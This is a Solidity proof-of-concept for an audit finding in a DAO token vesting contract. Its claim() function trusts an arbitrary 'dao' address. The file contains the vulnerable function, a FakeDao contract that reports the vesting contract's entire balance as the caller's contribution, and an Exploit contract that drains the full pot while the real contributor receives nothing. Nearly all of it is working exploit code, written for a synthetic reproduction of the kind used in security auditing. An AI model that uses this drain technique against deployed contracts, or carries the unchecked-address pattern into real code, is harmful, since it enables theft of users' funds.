// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Daos.live DaosVesting — claim() drains a legitimate DAO's vested tokens
    (Shieldify, DaosLive, finding 57866 / C-01).
    SYNTHETIC, cheatcode-free. claim() is the audited function, copied verbatim (@> VULN).

    claim takes an arbitrary dao address, reads token() and
    getContributionTokenAmount from it, and pays that amount out of the
    vesting contract's balance of that token. A fake IDaosLive names the real
    DAO token, reports the whole pot as the caller's contribution, and arms a
    100% schedule. The attacker receives the full 1,000. A real contributor
    receives 0.

    The control accepts a claim only from a registered DaosLive and pays the
    stored contribution of that user (250), not the contract's balance. */

interface IDaosLive {
    function token() external view returns (address);
    function getContributionTokenAmount(address user) external view returns (uint256);
}

library TransferHelper {
    function safeTransfer(address token, address to, uint256 amount) internal {
        DaoToken(token).transfer(to, amount);
    }
}

contract DaoToken {
    string public name = "DaosLive";
    string public symbol = "DAO";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract DaosVesting {
    error InvalidCalculation();

    uint256 public constant DENOMINATOR = 10_000;

    struct Schedule {
        uint256 date;
        uint256 unlockPercent;
    }

    mapping(address => Schedule[]) internal _schedules;
    mapping(address => mapping(address => uint256)) public claimedAmounts;
    mapping(address => uint256) public totalClaimeds;

    function scheduleOf(address dao, uint256 index) external view returns (uint256 date, uint256 unlockPercent) {
        Schedule memory schedule = _schedules[dao][index];
        date = schedule.date;
        unlockPercent = schedule.unlockPercent;
    }

    function setSchedules(Schedule[] calldata _schedulesIn) external {
        delete _schedules[msg.sender];
        uint256 n = _schedulesIn.length;
        for (uint256 i = 0; i < n; i++) {
            _schedules[msg.sender].push(_schedulesIn[i]);
        }
    }

    function getClaimablePercent(address dao, uint256 index) public view returns (uint256) {
        Schedule memory schedule = _schedules[dao][index];
        if (block.timestamp < schedule.date) return 0;
        return schedule.unlockPercent;
    }

    function claim(address dao, address user, uint256 index) external {
        IDaosLive daosLive = IDaosLive(dao);
        // @> VULN: dao is not checked. token() and the contribution amount come from that contract, and the transfer pays them out of this vesting pot.
        address token = daosLive.token();

        uint256 maxPercent = getClaimablePercent(dao, index);
        if (maxPercent > DENOMINATOR) revert InvalidCalculation();

        unchecked {
            uint256 totalAmount = daosLive.getContributionTokenAmount(user);
            uint256 maxAmount = (totalAmount * maxPercent) / DENOMINATOR;
            if (maxAmount < claimedAmounts[dao][user]) {
                revert InvalidCalculation();
            }
            uint256 amount = maxAmount - claimedAmounts[dao][user];

            if (amount > 0) {
                claimedAmounts[dao][user] += amount;
                totalClaimeds[dao] += amount;
                TransferHelper.safeTransfer(token, user, amount);
            }
        }
    }
}

/// Fake IDaosLive. Reports the vesting contract's whole token balance as the caller's contribution.
contract FakeDao is IDaosLive {
    address public token;
    DaosVesting public vesting;

    constructor(address _token, address _vesting) {
        token = _token;
        vesting = DaosVesting(_vesting);
    }

    function getContributionTokenAmount(address) external view returns (uint256) {
        return DaoToken(token).balanceOf(address(vesting));
    }

    function arm() external {
        DaosVesting.Schedule[] memory rows = new DaosVesting.Schedule[](1);
        rows[0].date = 0;
        rows[0].unlockPercent = DaosVesting(vesting).DENOMINATOR();
        vesting.setSchedules(rows);
    }
}

contract Exploit {
    uint256 public constant POT = 1000e18;
    address public constant CONTRIBUTOR = 0x000000000000000000000000000000000000bEEF;

    DaoToken public token; // nonce 1
    DaosVesting public vesting; // nonce 2
    FakeDao public fake; // nonce 3

    uint256 public attackerBalance;
    uint256 public contributorBalance;
    uint256 public potLeft;

    constructor() {
        token = new DaoToken();
        vesting = new DaosVesting();
        fake = new FakeDao(address(token), address(vesting));
        token.mint(address(vesting), POT);
    }

    function run() external {
        uint256 beforePot = token.balanceOf(address(vesting));
        require(beforePot == POT, "pot not funded");
        require(token.balanceOf(CONTRIBUTOR) == 0, "contributor already paid");

        fake.arm();
        (uint256 date, uint256 unlockPercent) = vesting.scheduleOf(address(fake), 0);
        require(date == 0, "schedule date");
        require(unlockPercent == 10_000, "schedule not 100 percent");

        uint256 reported = fake.getContributionTokenAmount(address(this));
        require(reported == POT, "fake did not report the whole pot");

        vesting.claim(address(fake), address(this), 0);

        attackerBalance = token.balanceOf(address(this));
        contributorBalance = token.balanceOf(CONTRIBUTOR);
        potLeft = token.balanceOf(address(vesting));
        require(attackerBalance == POT, "attacker did not take the pot");
        require(contributorBalance == 0, "contributor was paid");
        require(potLeft == 0, "vesting still holds tokens");
    }
}
